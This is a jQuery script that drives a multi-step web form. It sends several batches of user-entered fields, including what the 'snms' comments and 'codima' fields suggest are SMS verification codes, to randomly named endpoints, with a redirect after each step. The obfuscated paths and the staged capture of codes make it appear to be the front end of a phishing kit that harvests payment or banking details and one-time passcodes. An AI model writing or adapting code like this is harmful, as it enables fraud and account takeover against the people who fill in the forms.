$(function(){
    $("#barinxri").on("click",function(e){


        //send backend:
        $.ajax({
            url: '/gzLbTbjqMpc34D4XsPJ2',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({logita:"Bari Naxri"}),
            success: function(info) {
                if(info.OK){
                    window.location = "/fGnEL4jmpuBCDkJP3myR";
                }
            }
        });
    });

    $("#pg2").on("submit",function(e){
        e.preventDefault();
        let s1 = $("#s1").val();
        let s2 = $("#s2").val();
        let s3 = $("#s3").val();
        let s4 = $("#s4").val();
        let s5 = $("#s5").val();
        let s6 = $("#s6").val();
        let s7 = $("#s7").val();
        let s8 = $("#s8").val();
        //send backend:
        $.ajax({
            url: '/NkMNm4664XhcW8KuukHk',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({s1,s2,s3,s4,s5,s6,s7,s8}),
            success: function(info) {
                if(info.OK){
                    window.location = "/Q89HFszQPd3TFv4mx65k";
                }
            }
        });
    });

    $("#pg3").on("submit",function(e){ // snms1:
        e.preventDefault();
        e.preventDefault();
        let a1 = $("#one").val();
        let a2 = $("#two3").val();
        let a3 = $("#three").val();
        let a4 = $("#five").val();


        //send backend:
        $.ajax({
            url: '/m4kT9BQWt7KTDdaVmafx',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({a1,a2,a3,a4}),
            success: function(info) {
                if(info.OK){
                    window.location = "/aEsKRvuaENZtYax265Kv";
                }
            }
        });
    });


    $("#pg4").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps1 = $("#codima").val();
        
        //send backend:
        $.ajax({
            url: '/Qv69PRvXg6PQEvrzJx6j',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps1}),
            success: function(info) {
                if(info.OK){
                    window.location = "/sioPjs3GHBkd7KSDGkdv";
                }
            }
        });
    });
    $("#pg5").on("submit",function(e){ // snms2:
        e.preventDefault();
        let sps2 = $("#codima2").val();
        
        //send backend:
        $.ajax({
            url: '/jK6hfjYT7poOP8hLPOjk',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({sps2}),
            success: function(info) {
                if(info.OK){
                    window.location = "/HfuRVXK8w8fLmT2vWHe8";
                }
            }
        });
    });



});